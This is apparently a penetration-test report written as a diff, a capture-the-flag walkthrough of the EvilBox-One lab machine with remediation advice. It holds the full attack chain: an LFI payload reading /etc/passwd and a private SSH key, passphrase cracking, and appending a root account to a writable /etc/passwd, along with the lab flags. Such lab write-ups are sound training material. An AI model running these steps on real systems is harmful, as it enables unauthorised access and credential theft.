@@ -1,0 +1,903 @@
+# EvilBox-One - Penetration Test Report
+
+---
+
+## Executive Summary
+
+| Field | Details |
+|-------|---------|
+| **Target** | EvilBox-One (OffSec Proving Grounds) |
+| **IP Address** | 192.168.125.212 |
+| **Pentester** | Eli Gofman (Dumah) |
+| **Date** | February 6, 2026 |
+| **Difficulty** | Easy |
+| **Result** | Full System Compromise |
+
+### Flags Captured
+
+| Type | Flag |
+|------|------|
+| 🚩 **User** | `cdd976281bb6a057e4f29c5f4a8ea8f8` |
+| 🚩 **Root** | `da0992d2dff9a915a7e26803cd7c63ec` |
+
+---
+
+## Table of Contents
+
+1. [Reconnaissance](#1-reconnaissance)
+2. [Enumeration](#2-enumeration)
+3. [Vulnerability Discovery](#3-vulnerability-discovery)
+4. [Initial Access](#4-initial-access)
+5. [Privilege Escalation](#5-privilege-escalation)
+6. [Post-Exploitation](#6-post-exploitation)
+7. [Credentials Summary](#7-credentials-summary)
+8. [Remediation Recommendations](#8-remediation-recommendations)
+9. [Attack Path Diagram](#9-attack-path-diagram)
+
+---
+
+## 1. Reconnaissance
+
+### 1.1 Network Configuration
+
+**Attacker Machine:**
+- IP Address: `192.168.45.162`
+- Interface: `tun0` (VPN)
+
+**Target Machine:**
+- IP Address: `192.168.125.212`
+- Hostname: `EvilBoxOne`
+
+### 1.2 Initial Port Scan
+
+A comprehensive Nmap scan was performed to identify open ports and running services.
+
+**Command:**
+```bash
+nmap -sC -sV -oA scans/initial 192.168.125.212
+```
+
+**Results:**
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
+|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
+|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.38 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+**Summary of Open Ports:**
+
+| Port | Service | Version | Notes |
+|------|---------|---------|-------|
+| 22 | SSH | OpenSSH 7.9p1 (Debian) | Protocol 2.0 |
+| 80 | HTTP | Apache 2.4.38 (Debian) | Default page displayed |
+
+---
+
+## 2. Enumeration
+
+### 2.1 Web Server Enumeration
+
+#### HTTP Headers Analysis
+
+**Command:**
+```bash
+curl -s -I http://192.168.125.212/
+```
+
+**Response:**
+```
+HTTP/1.1 200 OK
+Server: Apache/2.4.38 (Debian)
+Last-Modified: Mon, 16 Aug 2021 09:21:52 GMT
+Content-Type: text/html
+```
+
+The web server displayed the default Apache2 Debian page, indicating potential hidden content.
+
+#### Directory Enumeration
+
+**Command:**
+```bash
+gobuster dir -u http://192.168.125.212/ -w /usr/share/wordlists/dirb/common.txt -t 50
+```
+
+**Results:**
+```
+/index.html           (Status: 200) [Size: 10701]
+/robots.txt           (Status: 200) [Size: 12]
+/secret               (Status: 301) [Size: 319] --> http://192.168.125.212/secret/
+/server-status        (Status: 403) [Size: 280]
+```
+
+**Key Findings:**
+- `/robots.txt` - Contains message: "Hello H4x0r"
+- `/secret/` - Hidden directory discovered
+
+#### Robots.txt Analysis
+
+**Command:**
+```bash
+curl -s http://192.168.125.212/robots.txt
+```
+
+**Response:**
+```
+Hello H4x0r
+```
+
+This message hints at intentional challenges and confirms we're on the right track for a CTF-style box.
+
+### 2.2 Secret Directory Enumeration
+
+**Command:**
+```bash
+gobuster dir -u http://192.168.125.212/secret/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 50
+```
+
+**Results:**
+```
+/evil.php             (Status: 200) [Size: 0]
+/index.html           (Status: 200) [Size: 4]
+```
+
+**Critical Finding:** `evil.php` file discovered - returns empty response, suggesting it requires parameters.
+
+---
+
+## 3. Vulnerability Discovery
+
+### 3.1 Parameter Fuzzing
+
+The `evil.php` file returned an empty response when accessed directly. Parameter fuzzing was performed to identify any hidden parameters.
+
+**Command:**
+```bash
+ffuf -u "http://192.168.125.212/secret/evil.php?FUZZ=/etc/passwd" \
+     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+     -fs 0 -t 50
+```
+
+**Results:**
+```
+command                 [Status: 200, Size: 1398, Words: 13, Lines: 27]
+```
+
+**Vulnerability Identified:** Local File Inclusion (LFI) via the `command` parameter.
+
+### 3.2 LFI Confirmation
+
+**Command:**
+```bash
+curl -s "http://192.168.125.212/secret/evil.php?command=/etc/passwd"
+```
+
+**Response (full output):**
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+```
+
+**User Discovered:** `mowree` (UID 1000) - Regular user with bash shell
+
+### 3.3 Additional LFI Enumeration
+
+With LFI confirmed, additional sensitive files were checked:
+
+**Checking for authorized_keys:**
+```bash
+curl -s "http://192.168.125.212/secret/evil.php?command=/home/mowree/.ssh/authorized_keys"
+```
+*Result: File exists (SSH key authentication enabled)*
+
+**Checking Apache configuration:**
+```bash
+curl -s "http://192.168.125.212/secret/evil.php?command=/etc/apache2/sites-enabled/000-default.conf"
+```
+*Result: Standard Apache virtual host configuration*
+
+---
+
+## 4. Initial Access
+
+### 4.1 SSH Key Extraction
+
+Using the LFI vulnerability, the target user's SSH private key was extracted.
+
+**Command:**
+```bash
+curl -s "http://192.168.125.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa"
+```
+
+**Response:**
+```
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E
+
+uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
+hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
+o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
++gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
+b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
+HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
+9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
+zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
+rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
+tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
+94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
+VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
+Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
+hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
+Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
+IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
+MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
+62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
+Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
+p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
+pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
+KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
+i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
+4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
+8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
+-----END RSA PRIVATE KEY-----
+```
+
+**Note:** The private key is encrypted with 3DES-CBC encryption.
+
+### 4.2 SSH Key Passphrase Cracking
+
+The encrypted SSH key was converted to a hash format for cracking.
+
+**Step 1: Convert to John format**
+```bash
+ssh2john mowree_id_rsa > mowree_hash.txt
+```
+
+**Step 2: Crack with John the Ripper**
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt mowree_hash.txt
+```
+
+**Result:**
+```
+unicorn          (mowree_id_rsa)
+```
+
+**Passphrase Cracked:** `unicorn`
+
+### 4.3 SSH Authentication
+
+**Step 1: Save the SSH key and set permissions**
+```bash
+curl -s "http://192.168.125.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa" > mowree_id_rsa
+chmod 600 mowree_id_rsa
+```
+
+**Step 2: Connect via SSH**
+```bash
+sshpass -P "passphrase" -p "unicorn" ssh -i mowree_id_rsa mowree@192.168.125.212
+```
+
+**SSH Session Established:**
+```
+Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Feb 6 09:27:15 2026 from 192.168.45.162
+mowree@EvilBoxOne:~$
+```
+
+**Result:** Successfully authenticated as user `mowree`
+
+### 4.4 User Flag
+
+**Command:**
+```bash
+cat /home/mowree/local.txt
+```
+
+**User Flag:** `cdd976281bb6a057e4f29c5f4a8ea8f8`
+
+**User Home Directory Contents:**
+```bash
+ls -la /home/mowree/
+```
+```
+total 32
+drwxr-xr-x 4 mowree mowree 4096 jun 17  2022 .
+drwxr-xr-x 3 root   root   4096 ago 16  2021 ..
+lrwxrwxrwx 1 root   root      9 ago 16  2021 .bash_history -> /dev/null
+-rwxr-xr-x 1 mowree mowree  220 ago 16  2021 .bash_logout
+-rwxr-xr-x 1 mowree mowree 3526 ago 16  2021 .bashrc
+drwxr-xr-x 3 mowree mowree 4096 ago 16  2021 .local
+-r-------- 1 mowree mowree   33 feb  6 09:59 local.txt
+-rwxr-xr-x 1 mowree mowree  807 ago 16  2021 .profile
+drwxr-xr-x 2 mowree mowree 4096 ago 16  2021 .ssh
+```
+
+*Note: `.bash_history` is symlinked to `/dev/null` - indicates security hardening attempt*
+
+---
+
+## 5. Privilege Escalation
+
+### 5.1 Initial Enumeration
+
+With user access obtained, standard privilege escalation enumeration was performed.
+
+**System Information:**
+```bash
+id
+```
+```
+uid=1000(mowree) gid=1000(mowree) grupos=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+```
+
+**Hostname:**
+```bash
+hostname
+```
+```
+EvilBoxOne
+```
+
+**Sudo Privileges Check:**
+```bash
+sudo -l
+```
+```
+[sudo] password for mowree: 
+Sorry, user mowree may not run sudo on EvilBoxOne.
+```
+*Result: No sudo privileges available*
+
+**SUID Binaries:**
+```bash
+find / -perm -4000 2>/dev/null
+```
+```
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/fusermount
+```
+*Result: Standard SUID binaries only - no exploitable vectors identified*
+
+**Crontab Check:**
+```bash
+cat /etc/crontab
+```
+```
+# /etc/crontab: system-wide crontab
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+```
+*Result: No custom cron jobs - standard system crontab*
+
+**Checking for Capabilities:**
+```bash
+getcap -r / 2>/dev/null
+```
+*Result: No interesting capabilities found*
+
+### 5.2 File Permission Misconfiguration
+
+During enumeration, a critical misconfiguration was discovered in system file permissions.
+
+**Checking sensitive file permissions:**
+```bash
+ls -la /etc/passwd /etc/shadow
+```
+
+**Result:**
+```
+-rw-rw-rw- 1 root root   1398 ago 16  2021 /etc/passwd
+-rw-r----- 1 root shadow  976 ago 16  2021 /etc/shadow
+```
+
+**Critical Finding:** `/etc/passwd` is world-writable (permissions: 666)
+
+This is an extremely dangerous misconfiguration. While `/etc/shadow` has correct permissions (640), the world-writable `/etc/passwd` allows any user to:
+1. Add new users with arbitrary UIDs (including UID 0 for root)
+2. Modify existing user entries
+3. Change user shells and home directories
+
+### 5.3 Exploitation
+
+With write access to `/etc/passwd`, a new root-level user was created.
+
+**Understanding the Attack:**
+
+The `/etc/passwd` file format is:
+```
+username:password:UID:GID:comment:home:shell
+```
+
+By adding a user with UID 0 and GID 0, we can create a new root-equivalent account.
+
+**Step 1: Generate password hash**
+```bash
+openssl passwd -1 hacked
+```
+**Output:** `$1$Yt1HoyxH$FzbAwrVjGVDlIu5Viz.3c/`
+
+*The `-1` flag generates an MD5-based password hash*
+
+**Step 2: Verify current /etc/passwd entries**
+```bash
+tail -3 /etc/passwd
+```
+```
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+```
+
+**Step 3: Append new root user to /etc/passwd**
+```bash
+echo 'hacker:$1$Yt1HoyxH$FzbAwrVjGVDlIu5Viz.3c/:0:0:root:/root:/bin/bash' >> /etc/passwd
+```
+
+**Step 4: Verify the new entry**
+```bash
+tail -1 /etc/passwd
+```
+```
+hacker:$1$Yt1HoyxH$FzbAwrVjGVDlIu5Viz.3c/:0:0:root:/root:/bin/bash
+```
+
+**Step 5: Switch to root user**
+```bash
+su - hacker
+Password: hacked
+```
+
+**Result:**
+```
+uid=0(root) gid=0(root) grupos=0(root)
+```
+
+**Root shell obtained!**
+
+### 5.4 Root Flag
+
+**Command:**
+```bash
+cat /root/proof.txt
+```
+
+**Root Flag:** `da0992d2dff9a915a7e26803cd7c63ec`
+
+**Root Directory Contents:**
+```bash
+ls -la /root/
+```
+```
+total 28
+drwx------  3 root root 4096 feb  6 09:59 .
+drwxr-xr-x 18 root root 4096 ago 16  2021 ..
+lrwxrwxrwx  1 root root    9 ago 16  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root  570 ene 31  2010 .bashrc
+drwxr-xr-x  3 root root 4096 ago 16  2021 .local
+-rw-r--r--  1 root root  148 ago 17  2015 .profile
+-r--------  1 root root   33 feb  6 09:59 proof.txt
+```
+
+---
+
+## 6. Post-Exploitation
+
+### 6.1 System Information
+
+**Kernel Version:**
+```bash
+uname -a
+```
+```
+Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux
+```
+
+**OS Release:**
+```bash
+cat /etc/os-release
+```
+```
+PRETTY_NAME="Debian GNU/Linux 10 (buster)"
+NAME="Debian GNU/Linux"
+VERSION_ID="10"
+VERSION="10 (buster)"
+VERSION_CODENAME=buster
+ID=debian
+```
+
+| Property | Value |
+|----------|-------|
+| Hostname | EvilBoxOne |
+| OS | Debian GNU/Linux 10 (Buster) |
+| Kernel | 4.19.0-17-amd64 |
+| Architecture | x86_64 |
+
+### 6.2 User Accounts
+
+| Username | UID | Shell | Notes |
+|----------|-----|-------|-------|
+| root | 0 | /bin/bash | System administrator |
+| mowree | 1000 | /bin/bash | Regular user - compromised |
+| hacker | 0 | /bin/bash | Created by attacker |
+
+### 6.3 Network Configuration
+
+**Network Interfaces:**
+```bash
+ip addr
+```
+```
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN
+    inet 127.0.0.1/8 scope host lo
+2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP
+    inet 192.168.125.212/24 brd 192.168.125.255 scope global ens192
+```
+
+### 6.4 Installed Services
+
+**Listening Services:**
+```bash
+ss -tlnp
+```
+```
+State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
+LISTEN   0        128      0.0.0.0:22           0.0.0.0:*        users:(("sshd",pid=516,fd=3))
+LISTEN   0        128      *:80                 *:*              users:(("apache2",pid=533,fd=4))
+LISTEN   0        128      [::]:22              [::]:*           users:(("sshd",pid=516,fd=4))
+```
+
+### 6.5 Web Application Analysis
+
+**Web Root Contents:**
+```bash
+ls -la /var/www/html/
+```
+```
+total 24
+drwxr-xr-x 3 root root  4096 ago 16  2021 .
+drwxr-xr-x 3 root root  4096 ago 16  2021 ..
+-rw-r--r-- 1 root root 10701 ago 16  2021 index.html
+-rw-r--r-- 1 root root    12 ago 16  2021 robots.txt
+drwxr-xr-x 2 root root  4096 ago 16  2021 secret
+```
+
+**Vulnerable PHP File Content:**
+```bash
+cat /var/www/html/secret/evil.php
+```
+```php
+<?php
+    $filename = $_GET['command'];
+    include($filename);
+?>
+```
+
+This confirms the LFI vulnerability - the `include()` function directly uses user input without any sanitization.
+
+---
+
+## 7. Credentials Summary
+
+### Discovered Credentials
+
+| Username | Credential Type | Value | Service | Access Level |
+|----------|-----------------|-------|---------|--------------|
+| mowree | SSH Private Key | [Encrypted RSA Key] | SSH | User |
+| mowree | Key Passphrase | `unicorn` | SSH | User |
+| hacker | Password | `hacked` | Local | Root |
+
+### Files Extracted
+
+| File | Path | Purpose |
+|------|------|---------|
+| SSH Private Key | `/home/mowree/.ssh/id_rsa` | Remote authentication |
+| /etc/passwd | `/etc/passwd` | User enumeration + privesc |
+
+---
+
+## 8. Remediation Recommendations
+
+### Critical Priority
+
+| ID | Vulnerability | Severity | Recommendation |
+|----|---------------|----------|----------------|
+| V-001 | Local File Inclusion (LFI) | **Critical** | Sanitize and validate all user input. Implement whitelist-based file access controls. Remove or secure `evil.php`. |
+| V-002 | World-Writable /etc/passwd | **Critical** | Immediately restore correct permissions: `chmod 644 /etc/passwd`. Audit all system file permissions. |
+
+### High Priority
+
+| ID | Vulnerability | Severity | Recommendation |
+|----|---------------|----------|----------------|
+| V-003 | Weak SSH Key Passphrase | **High** | Enforce strong passphrase policies. Consider using ed25519 keys with strong passphrases. |
+| V-004 | SSH Key Accessible via Web | **High** | Restrict web server permissions. Ensure `.ssh` directories are not readable by web users. |
+
+### Medium Priority
+
+| ID | Vulnerability | Severity | Recommendation |
+|----|---------------|----------|----------------|
+| V-005 | Apache Default Page | **Medium** | Remove or customize default pages. Implement proper web application. |
+| V-006 | Hidden Directories | **Medium** | Implement proper access controls. Use authentication for sensitive directories. |
+
+### Detailed Remediation Steps
+
+#### 1. Fix /etc/passwd Permissions
+```bash
+chmod 644 /etc/passwd
+chown root:root /etc/passwd
+# Remove unauthorized users
+grep -v "hacker" /etc/passwd > /tmp/passwd.clean
+mv /tmp/passwd.clean /etc/passwd
+```
+
+#### 2. Remove/Secure Vulnerable PHP File
+```bash
+rm /var/www/html/secret/evil.php
+# Or implement proper input validation if functionality is required
+```
+
+#### 3. Regenerate SSH Keys
+```bash
+# As user mowree
+rm ~/.ssh/id_rsa*
+ssh-keygen -t ed25519 -a 100 -f ~/.ssh/id_ed25519
+```
+
+#### 4. File System Audit
+```bash
+# Find world-writable files
+find / -type f -perm -002 -ls 2>/dev/null
+# Find world-writable directories
+find / -type d -perm -002 -ls 2>/dev/null
+```
+
+---
+
+## 9. Attack Path Diagram
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                        ATTACK PATH                               │
+└─────────────────────────────────────────────────────────────────┘
+
+    ┌──────────────┐
+    │   ATTACKER   │
+    │ 192.168.45.162│
+    └──────┬───────┘
+           │
+           │ [1] Nmap Scan
+           ▼
+    ┌──────────────┐
+    │  Port 80     │
+    │  Apache      │
+    └──────┬───────┘
+           │
+           │ [2] Gobuster
+           ▼
+    ┌──────────────┐
+    │  /secret/    │
+    │  evil.php    │
+    └──────┬───────┘
+           │
+           │ [3] Parameter Fuzzing (ffuf)
+           ▼
+    ┌──────────────┐
+    │  LFI Found   │
+    │  ?command=   │
+    └──────┬───────┘
+           │
+           │ [4] Extract SSH Key
+           │     /home/mowree/.ssh/id_rsa
+           ▼
+    ┌──────────────┐
+    │  Crack Key   │
+    │  Passphrase  │
+    │  "unicorn"   │
+    └──────┬───────┘
+           │
+           │ [5] SSH as mowree
+           ▼
+    ┌──────────────┐
+    │  USER SHELL  │◄─── local.txt: cdd976281bb6a057e4f29c5f4a8ea8f8
+    │   mowree     │
+    └──────┬───────┘
+           │
+           │ [6] /etc/passwd is 666
+           ▼
+    ┌──────────────┐
+    │ Add root user│
+    │   "hacker"   │
+    └──────┬───────┘
+           │
+           │ [7] su - hacker
+           ▼
+    ┌──────────────┐
+    │  ROOT SHELL  │◄─── proof.txt: da0992d2dff9a915a7e26803cd7c63ec
+    │    uid=0     │
+    └──────────────┘
+```
+
+---
+
+## Appendix A: Tools Used
+
+| Tool | Purpose | Version |
+|------|---------|---------|
+| Nmap | Port scanning and service enumeration | 7.98 |
+| Gobuster | Directory/file brute-forcing | 3.8.2 |
+| ffuf | Parameter fuzzing | 2.1.0 |
+| curl | HTTP requests | - |
+| ssh2john | SSH key hash extraction | John the Ripper |
+| John the Ripper | Password/passphrase cracking | - |
+| OpenSSL | Password hash generation | - |
+| sshpass | Non-interactive SSH authentication | - |
+
+---
+
+## Appendix B: Vulnerability Details
+
+### V-001: Local File Inclusion (LFI)
+
+| Property | Value |
+|----------|-------|
+| **Location** | `/secret/evil.php` |
+| **Parameter** | `command` |
+| **Type** | PHP include() LFI |
+| **CVSS 3.1** | 9.8 (Critical) |
+| **CWE** | CWE-98: Improper Control of Filename for Include/Require |
+
+**Vulnerable Code:**
+```php
+<?php
+    $filename = $_GET['command'];
+    include($filename);
+?>
+```
+
+**Impact:** 
+- Read arbitrary files on the system
+- Potential Remote Code Execution via log poisoning or PHP wrappers
+- Credential theft (SSH keys, configuration files)
+
+### V-002: World-Writable /etc/passwd
+
+| Property | Value |
+|----------|-------|
+| **File** | `/etc/passwd` |
+| **Permissions** | `-rw-rw-rw-` (666) |
+| **Expected** | `-rw-r--r--` (644) |
+| **CVSS 3.1** | 9.8 (Critical) |
+| **CWE** | CWE-732: Incorrect Permission Assignment for Critical Resource |
+
+**Impact:**
+- Any local user can add root-level accounts
+- Complete system compromise
+- Persistence through unauthorized user accounts
+
+### V-003: Weak SSH Key Passphrase
+
+| Property | Value |
+|----------|-------|
+| **User** | mowree |
+| **Passphrase** | `unicorn` |
+| **Crack Time** | < 1 second |
+| **Wordlist** | rockyou.txt |
+| **CVSS 3.1** | 7.5 (High) |
+| **CWE** | CWE-521: Weak Password Requirements |
+
+---
+
+## Appendix C: References
+
+- [OWASP - Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
+- [HackTricks - LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
+- [Linux Privilege Escalation - /etc/passwd writable](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd)
+- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
+- [GTFOBins](https://gtfobins.github.io/)
+
+---
+
+## Appendix D: Raw Scan Files
+
+The following files were generated during the engagement:
+
+| File | Description |
+|------|-------------|
+| `scans/initial.nmap` | Nmap scan results (text format) |
+| `scans/initial.xml` | Nmap scan results (XML format) |
+| `scans/initial.gnmap` | Nmap scan results (grepable format) |
+| `scans/gobuster_common.txt` | Directory enumeration results |
+| `scans/gobuster_secret.txt` | Secret directory enumeration |
+| `credentials/mowree_id_rsa` | Extracted SSH private key |
+| `credentials/mowree_hash.txt` | SSH key hash for cracking |
+
+---
+
+## Appendix E: Timeline Summary
+
+| Time (EST) | Phase | Action | Result |
+|------------|-------|--------|--------|
+| 04:17 | Setup | Engagement initialized | MCP tracking started |
+| 04:18 | Recon | Nmap port scan | Ports 22, 80 discovered |
+| 04:20 | Enum | Gobuster directory scan | /secret/ found |
+| 04:22 | Enum | Gobuster with extensions | evil.php discovered |
+| 04:24 | Vuln | Parameter fuzzing (ffuf) | LFI parameter 'command' found |
+| 04:25 | Vuln | LFI exploitation | /etc/passwd extracted |
+| 04:25 | Exploit | SSH key extraction | mowree's id_rsa obtained |
+| 04:26 | Exploit | Passphrase cracking | 'unicorn' cracked |
+| 04:27 | Access | SSH authentication | User shell obtained |
+| 04:28 | Flag | User flag captured | cdd976281bb6a057e4f29c5f4a8ea8f8 |
+| 04:30 | Privesc | File permission enum | /etc/passwd world-writable |
+| 04:32 | Privesc | Add root user | hacker:hacked added |
+| 04:33 | Root | Privilege escalation | Root shell obtained |
+| 04:33 | Flag | Root flag captured | da0992d2dff9a915a7e26803cd7c63ec |
+
+**Total Time to Root:** ~16 minutes
+
+---
+
+## Report Information
+
+| Field | Details |
+|-------|---------|
+| **Author** | Eli Gofman (Dumah) |
+| **Date** | February 6, 2026 |
+| **Classification** | Confidential |
+| **Version** | 1.0 |
+
+---
+
+*This penetration test was conducted in a controlled lab environment for educational purposes.*
